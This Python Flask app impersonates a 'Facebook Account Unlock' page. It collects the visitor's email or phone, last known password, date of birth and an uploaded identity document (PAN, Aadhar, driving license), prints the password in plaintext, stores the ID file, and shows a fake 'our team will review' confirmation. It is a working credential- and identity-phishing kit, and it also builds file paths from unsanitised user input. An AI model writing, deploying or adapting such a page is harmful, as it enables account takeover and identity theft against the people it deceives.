from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

# Configure the upload folder
UPLOAD_FOLDER = './uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf'}

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)


# Check if file extension is allowed
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/')
def index():
    return '''
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook Account Unlock</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f0f0f5;
                color: #333;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 50px auto;
                background: #fff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            }
            h1 {
                text-align: center;
                color: #4CAF50;
            }
            label {
                display: block;
                margin-top: 10px;
            }
            input, button {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
            }
            button {
                background-color: #4CAF50;
                color: white;
                border: none;
                cursor: pointer;
            }
            button:hover {
                background-color: #45a049;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Unlock Facebook Account</h1>
            <form action="/unlock" method="post" enctype="multipart/form-data">
                <label for="email_or_phone">Email or Mobile Number:</label>
                <input type="text" id="email_or_phone" name="email_or_phone" required>
                
                <label for="password">Last Known Password:</label>
                <input type="password" id="password" name="password" required>
                
                <label for="dob">Date of Birth:</label>
                <input type="date" id="dob" name="dob" required>
                
                <label for="proof">Upload Proof (e.g., PAN, Aadhar, Driving License):</label>
                <input type="file" id="proof" name="proof" accept=".png, .jpg, .jpeg, .pdf" required>
                
                <button type="submit">Submit</button>
            </form>
        </div>
    </body>
    </html>
    '''


@app.route('/unlock', methods=['POST'])
def unlock_account():
    email_or_phone = request.form.get('email_or_phone')
    password = request.form.get('password')
    dob = request.form.get('dob')
    proof_file = request.files['proof']

    # Validate and save the uploaded file
    if proof_file and allowed_file(proof_file.filename):
        filename = f"{email_or_phone}_{proof_file.filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        proof_file.save(filepath)

        # Log the submission for demonstration purposes
        print(f"User details:\nEmail/Phone: {email_or_phone}\nPassword: {password}\nDate of Birth: {dob}\nProof: {filename}")

        # Simulate success message
        return '''
        <html>
        <head>
            <title>Success</title>
        </head>
        <body>
            <h1 style="color: green; text-align: center;">Account Unlock Request Submitted Successfully</h1>
            <p style="text-align: center;">Our team will review your submission and get back to you shortly.</p>
        </body>
        </html>
        '''
    else:
        return "Invalid file format. Please upload PNG, JPG, JPEG, or PDF files only."


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
